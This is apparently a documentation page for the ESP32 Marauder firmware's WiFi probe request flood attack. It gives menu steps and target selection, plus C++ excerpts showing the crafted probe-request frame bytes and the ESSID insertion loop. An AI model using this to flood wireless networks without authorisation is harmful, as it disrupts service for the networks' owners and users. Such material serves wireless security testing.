# Probe Request Flood

### Menu Location
`WiFi`>`Attacks`>`Probe Req Flood`  

### Info
The ESP32 is capable of transmitting specially crafted WiFi packets.

Before executing probe request flood attack on the ESP32 Marauder, you must build a list of available access points and select which access points to target. See [Scan APs](scan-aps) and [Select APs](select-aps) for more details on how to build a target list.

Once a proper target list has been built, an probe request flood can be executed by simply selecting the menu option. The packet transmission rate will be displayed on screen. The attack can be ended by touching the screen.

**NOTE: The more target networks selected, the less effective the attack will be. More networks means more time must be taken to send packets to each access point.**

The probe request packet is defined in [WiFiScan.h](https://github.com/justcallmekoko/ESP32Marauder/blob/master/esp32_marauder/WiFiScan.h) as the following:   
```C++
uint8_t prob_req_packet[128] = {0x40, 0x00, 0x00, 0x00, 
                                  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination
                                  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
                                  0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Dest
                                  0x01, 0x00, // Sequence
                                  0x00, // SSID Parameter
                                  0x00, // SSID Length
                                  /* SSID */
                                  };
```

As the marauder iterates through the list of access points, the probe request packet is populated with the information of each "active" access point such as length of ESSID and the ESSID itself.  
```C++
      // Set SSID length
      int ssidLen = access_points->get(i).essid.length();
      //int rand_len = sizeof(rand_reg);
      int fullLen = ssidLen;
      prob_req_packet[25] = fullLen;

      // Insert ESSID
      char buf[access_points->get(i).essid.length() + 1] = {};
      access_points->get(i).essid.toCharArray(buf, access_points->get(i).essid.length() + 1);
      
      for(int i = 0; i < ssidLen; i++)
        prob_req_packet[26 + i] = buf[i];
```

If the flood is executed properly, you should notice probe request replies from the targeted access points in a wireshark collection.